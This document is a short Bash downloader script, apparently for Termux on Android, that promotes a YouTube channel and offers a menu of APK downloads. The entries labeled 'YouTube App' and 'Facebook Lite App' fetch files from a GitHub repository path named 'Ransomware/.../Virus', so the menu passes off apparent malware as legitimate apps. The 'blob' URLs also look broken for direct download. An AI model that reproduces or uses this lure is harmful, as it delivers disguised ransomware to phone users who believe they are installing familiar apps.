#!/bin/bash

# Define Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# Create Download Directory
SDCARD_PATH="/storage/emulated/0/Download"
mkdir -p "$SDCARD_PATH"

# App Links (Replace with real links)
APP1_LINK="https://github.com/webappsite/Application/raw/refs/heads/main/Apk_editor/APK%20Editor.apk"
APP2_LINK="https://github.com/Masterdas/Ransomware/blob/main/Virus/Virus/Virus/Virus/Virus/Allapp/YouTube.apk"
APP3_LINK="https://github.com/Masterdas/Ransomware/blob/main/Virus/Virus/Virus/Virus/Virus/Allapp/Lite.apk"

# App File Names
APP1_NAME="Apk Editor.apk"
APP2_NAME="YouTube.apk"
APP3_NAME="Lite.apk"

# Banner
clear
echo -e "${CYAN}"
echo "   ============================================="
echo -e "${YELLOW}   Subscribe my YouTube Channel - ZERODARK NEXUS"
echo -e "${CYAN}   =============================================${NC}"

# Menu Loop
while true; do
    echo -e "${CYAN}\n[ MENU Options Select Apk Number ]"
    echo -e "${GREEN}1.${NC} APK editor App"
    echo -e "${GREEN}2.${NC} YouTube App"
    echo -e "${GREEN}3.${NC} Facebook Lite App"
    echo -e "${RED}4.${NC} Exit"
    echo -e "${CYAN}============================${NC}"
    read -p "$(echo -e ${YELLOW}Enter your choice [1-4]:${NC} ) " choice

    case $choice in
        1)
            echo -e "${YELLOW}\n APK editor App Downloading...${NC}"
            wget -O "$SDCARD_PATH/$APP1_NAME" "$APP1_LINK" && echo -e "${GREEN}Saved to $SDCARD_PATH/$APP1_NAME${NC}"
            ;;
        2)
            echo -e "${YELLOW}\n YouTube App Downloading..${NC}"
            wget -O "$SDCARD_PATH/$APP2_NAME" "$APP2_LINK" && echo -e "${GREEN}Saved to $SDCARD_PATH/$APP2_NAME${NC}"
            ;;
        3)
            echo -e "${YELLOW}\n Facebook Lite App Downloading...${NC}"
            wget -O "$SDCARD_PATH/$APP3_NAME" "$APP3_LINK" && echo -e "${GREEN}Saved to $SDCARD_PATH/$APP3_NAME${NC}"
            ;;
        4)
            echo -e "${RED}Goodbye Boss!${NC}"
            exit
            ;;
        *)
            echo -e "${RED}Invalid choice. Try again.${NC}"
            ;;
    esac
done
